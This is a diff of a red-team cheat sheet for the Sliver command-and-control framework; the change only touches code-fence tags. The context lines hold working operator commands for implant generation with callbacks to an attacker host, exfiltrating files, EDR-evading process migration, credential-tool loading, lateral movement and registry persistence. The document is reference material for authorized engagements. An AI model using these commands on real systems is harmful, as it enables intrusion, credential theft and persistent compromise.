@@ -17,7 +17,7 @@ Sliver is an open-source C2 framework from BishopFox. It supports multiple trans
 
 Listeners run on the C2 server and wait for implant callbacks. Choose the transport based on what egress is available on the target network and your OPSEC requirements.
 
-```bash
+```bash wrap
 mtls                                       # mutual TLS on port 8888; fully authenticated and encrypted
 https                                      # HTTPS on port 443; most firewall-friendly, preferred for engagements
 https --lhost 0.0.0.0 --lport 443         # explicitly bind HTTPS to all interfaces on 443
@@ -32,7 +32,7 @@ jobs --kill <job-id>                       # stop a specific listener
 
 Beacons are the default choice. Session implants are available when you need immediate interactivity. Output format determines whether you get an EXE, DLL, raw shellcode, or service binary.
 
-```bash
+```bash wrap
 # Beacon implants (preferred for real engagements)
 generate beacon --https $LHOST:443 --save .      # HTTPS beacon, output to current directory
 generate beacon --http $LHOST:80 --save .        # HTTP beacon
@@ -66,7 +66,7 @@ implants                                       # list all previously generated i
 
 These commands manage active beacons and sessions from the main Sliver console. Once you `use` an implant, subsequent commands run in its context.
 
-```bash
+```bash wrap
 beacons                          # list all beacons waiting to check in
 sessions                         # list all active interactive sessions
 use <id>                         # interact with a beacon or session by ID (tab-complete works)
@@ -82,7 +82,7 @@ tasks fetch <task-id>            # pull the output of a specific completed task
 
 Basic situational awareness commands to run immediately after getting a callback. Understand the user, host, network position, and what security tooling is present before doing anything else.
 
-```bash
+```bash wrap
 whoami                  # current username and domain
 getuid                  # numeric user ID (Linux) or SID (Windows)
 hostname                # machine hostname
@@ -98,7 +98,7 @@ screenshot              # capture a screenshot of the target desktop
 
 Standard file management from within a session or beacon context. Downloads and uploads work on both Windows and Linux targets.
 
-```bash
+```bash wrap
 upload /local/path/file.exe /remote/C:/Temp/file.exe     # push a file to the target
 download /remote/C:/Windows/Temp/loot.txt /local/loot/   # pull a file back to attacker
 ls /path/to/dir                                          # list directory contents
@@ -111,7 +111,7 @@ rm /path/to/file                                         # delete a file
 
 Use `execute` for single commands instead of opening a full interactive shell. A full shell is noisier, harder to log, and draws more EDR attention.
 
-```bash
+```bash wrap
 execute -o whoami                        # run a single command and capture output
 execute -o "net user /domain"            # run with arguments; quote the full command string
 execute -o "ipconfig /all"
@@ -122,7 +122,7 @@ shell                                    # open a full interactive shell (bash o
 
 Process listing helps you identify AV and EDR processes and find good migration targets. Migrating into a legitimate, long-running process makes the implant harder to detect and more survivable.
 
-```bash
+```bash wrap
 ps                                       # list all running processes with PID, name, owner, and architecture
 migrate <pid>                            # migrate implant into the target process
                                          # good targets: explorer.exe, svchost.exe, RuntimeBroker.exe
@@ -135,7 +135,7 @@ procdump <pid>                           # dump memory of a process to disk on t
 
 Sliver has built-in SOCKS5 and port forwarding to route traffic through an implant into unreachable network segments.
 
-```bash
+```bash wrap
 # SOCKS5 proxy: route tool traffic through the implant
 socks5 start --host 127.0.0.1 --port 1080   # bind a SOCKS5 proxy locally on the C2 server
 # add to /etc/proxychains.conf: socks5 127.0.0.1 1080
@@ -159,7 +159,7 @@ rportfwd                                     # list active reverse port forwards
 
 Sliver provides a built-in PsExec-style lateral movement command. For shellcode-based movement, generate a shellcode implant and inject it via a BOF or in-memory loader.
 
-```bash
+```bash wrap
 # Built-in PsExec-style lateral movement
 psexec --hostname $TARGET.$DOMAIN --username Administrator --password $PASSWORD
 
@@ -172,7 +172,7 @@ generate beacon --mtls $LHOST:8888 --format shellcode --save /tmp/beacon.bin
 
 Armory is Sliver's extension manager. It installs community tools (Rubeus, SharpHound, Seatbelt, Mimikatz, and others) as aliases that run in-memory via BOFs or .NET assemblies. Nothing touches disk.
 
-```bash
+```bash wrap
 armory install all                       # install all available packages
 armory install rubeus                    # install a single tool by name
 armory list                              # list available packages and their descriptions
@@ -189,7 +189,7 @@ sharpup audit                                             # check for common pri
 
 BOF (Beacon Object File) is a compiled C object that runs inside the beacon process. No binary is dropped to disk, the footprint is minimal, and execution is fast. Sliver is compatible with Cobalt Strike BOFs.
 
-```bash
+```bash wrap
 execute-bof /path/to/file.o                              # load and execute a BOF locally
 
 # TrustedSec's CS-Situational-Awareness-BOF pack works directly in Sliver
@@ -200,7 +200,7 @@ execute-bof /path/to/file.o                              # load and execute a BO
 
 Persistence mechanisms keep the implant running across reboots. Run these carefully and clean up after the engagement.
 
-```bash
+```bash wrap
 # Windows: write to the HKCU Run registry key (runs at user logon, no admin needed)
 registry write \
   --hive HKCU \
